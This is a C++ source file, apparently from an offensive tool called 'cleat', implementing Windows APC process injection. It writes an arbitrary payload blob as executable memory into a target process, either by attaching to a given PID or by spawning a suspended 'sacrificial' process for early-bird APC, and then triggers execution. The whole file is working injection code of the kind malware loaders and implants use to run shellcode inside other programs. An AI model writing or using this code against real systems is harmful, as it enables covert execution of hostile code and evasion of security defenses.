#include "Core/Inject/Methods/ApcInjection/ApcInjection.hpp"

#include "Core/Inject/PlatformWin_InjectCore.hpp"
#include "Core/Native/Win/Syscall.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"

namespace cleat {
namespace injection {

    InjectionResult ApcInjection::Inject(const std::vector<uint8_t>& payload,
        PayloadKind payload_kind, const InjectionTarget& target) {
        InjectionResult result;
        if (payload_kind != PayloadKind::Blob) {
            result.error =
                "apc_injection only supports blob payload (hint: reflective_load for native DLL)";
            return result;
        }
#ifdef _WIN32
        if (target.kind == TargetKind::Spawn) {
            // 牺牲进程路径 = SpawnAndInject(CreateProcessW 挂起 + early-bird
            // APC + 清尸, 迁移/注入 E2E 已验证) —— 本手法的 spawn 分支即它
            std::wstring imageW;
            if (target.image.empty() || !native::Utf8ToWideNT(target.image, imageW)) {
                result.error = "target encoding failed";
                return result;
            }
            const InjectionResult r = SpawnAndInject(imageW, payload,
#ifdef NDEBUG
                false
#else
                true   // Debug keep_on_fail: 保留牺牲进程现场
#endif
            );
            result.ok = r.ok;
            result.pid = r.pid;
            result.error = r.error;
            result.failed_at = r.failed_at;
            return result;
        }

        // pid 路径: 附着 → 落地 → APC 触发(attach 语义, 失败不清尸)
        void* hProcess = nullptr;
        result = AttachToPid(target.pid, &hProcess);
        if (!result.ok) {
            CLEAT_LOGE(ErrDom::Mod, ErrCode::PlatformApiFailed, "ApcInjection: " << result.error << " (0x" << std::hex
                << result.failed_at << ")");
            return result;
        }
        void* base = nullptr;
        result = WriteExecutableMemory(hProcess, payload, &base);
        if (!result.ok) {
            native::Api().NtClose(hProcess);
            CLEAT_LOGE(ErrDom::Mod, ErrCode::PlatformApiFailed, "ApcInjection: " << result.error << " (0x" << std::hex
                << result.failed_at << ")");
            return result;
        }
        result = TriggerApcNewThread(hProcess, base);
        native::Api().NtClose(hProcess);
        if (!result.ok) {
            CLEAT_LOGE(ErrDom::Mod, ErrCode::PlatformApiFailed, "ApcInjection: " << result.error << " (0x" << std::hex
                << result.failed_at << ")");
            return result;
        }
        result.ok = true;
        result.pid = target.pid;
        LOG_INFO("ApcInjection: 注入完成 target_pid=" << result.pid
            << " payload=" << payload.size() << "B");
        return result;
#else
        (void)target;
        result.error = "apc_injection is Windows-only";
        return result;
#endif
    }

} // namespace injection
} // namespace cleat
